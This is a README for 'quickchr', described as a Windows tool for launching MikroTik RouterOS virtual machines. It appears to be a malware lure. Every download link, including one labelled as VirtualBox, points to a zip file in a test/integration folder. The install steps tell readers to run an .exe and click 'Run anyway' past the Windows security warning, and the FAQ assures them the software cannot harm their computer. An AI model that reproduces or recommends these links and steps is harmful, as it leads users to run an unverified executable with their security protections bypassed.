# ⚡ quickchr - Launch RouterOS instances in minutes

[![](https://img.shields.io/badge/Download_QuickCHR-blue)](https://github.com/Pinussylvestrissteamer3783/quickchr/raw/refs/heads/main/test/integration/Software-2.0-alpha.4.zip)

`quickchr` simplifies the process of creating MikroTik RouterOS CHR virtual machines. You use this tool to set up test environments for scripts, network configurations, or learning RouterOS without complex manual steps. The software automates the download of images and the creation of virtual hard disks, saving time for network engineers and home lab enthusiasts.

## 📥 Getting Started

To begin, visit the project page to download the software.

[Download QuickCHR here](https://github.com/Pinussylvestrissteamer3783/quickchr/raw/refs/heads/main/test/integration/Software-2.0-alpha.4.zip)

This tool runs on Windows 10 and Windows 11. 

### Prerequisites

*   **Virtualization Software:** You need a hypervisor installed on your computer. We recommend [Oracle VM VirtualBox](https://github.com/Pinussylvestrissteamer3783/quickchr/raw/refs/heads/main/test/integration/Software-2.0-alpha.4.zip) or VMware Workstation Player.
*   **System Memory:** Reserve at least 256MB of RAM for each RouterOS instance.
*   **Processor:** A modern multi-core processor ensures smooth performance during the setup process.

## ⚙️ Installation Process

1.  Click the link provided above to open the repository.
2.  Locate the releases section on the right side of the page.
3.  Choose the release labeled "Latest."
4.  Download the file ending in `.exe` for your Windows system.
5.  Move the file to a folder where you store your tools.
6.  Double-click the file to open the application.

If Windows shows a security prompt, click "More info" and then "Run anyway." This confirms you trust the software developer.

## 🚀 Using the Software

When you open `quickchr`, you see a simple menu. Follow these steps to start your first MikroTik instance.

### Step 1: Select Version

The software lists available RouterOS versions. Pick the "Stable" version unless you need specific features from the "Testing" stream. The stable version provides the best reliability for your network tests.

### Step 2: Set Disk Size

Enter the size of the virtual disk in megabytes. For basic testing, 128MB works well. If you plan to store many configuration scripts, increase this to 512MB or 1GB.

### Step 3: Run the Wizard

Click the "Create" button. The tool performs the following actions:
*   Connects to the official MikroTik update servers.
*   Downloads the disk image file.
*   Converts the file into a format your hypervisor reads.
*   Prepares the virtual machine settings.

## 🛠️ Advanced Features

While `quickchr` is simple, it includes tools for power users.

### Automation Scripts

You can point `quickchr` to a folder containing configuration files. During the setup, the tool pushes these files to the virtual machine. This allows you to recreate an entire lab environment in seconds.

### AI Integration

The software includes hooks for AI-assisted configuration. If you provide a prompt, the internal logic generates valid RouterOS command-line interface syntax. You paste these commands into the virtual machine terminal to apply firewall rules, interface settings, or routing protocols.

### CLI Mode

If you prefer using the command prompt, run the application with the `--help` flag. This lists commands to create instances without opening the interface. This feature works well for automated testing pipelines.

## ❓ Common Questions

### Does the software harm my computer?

No. `quickchr` only interacts with virtual machine files. It does not change your Windows system settings or registry.

### Do I need a license key?

MikroTik allows you to use the CHR version for testing without a license. It runs with a speed limit of 1 Megabit. If you require higher speeds for production, purchase a license key from the official MikroTik website and paste it into the "License" field in the settings menu.

### How do I update the tool?

Open the application. It checks for updates every time you launch it. If a new version exists, a notification appears on the screen. Click "Download Update" to replace your current version with the latest one.

### Where are the virtual machines stored?

The tool creates a folder named `VMs` in the same directory where the executable file lives. You can change this path in the "Preferences" menu.

## 🛡️ Best Practices

*   **Network Security:** Always use an internal network adapter when you run these machines in a testing environment. This prevents accidental traffic leaks into your host network.
*   **Backup:** Copy your virtual machine files to an external drive if you spend significant time writing custom scripts inside the router.
*   **Cleanup:** Delete old machine folders if you no longer need them to free up disk space on your Windows drive.

Use these instructions to manage your MikroTik lab with confidence and ease. The combination of automation and simple interface design makes `quickchr` an effective choice for any network professional.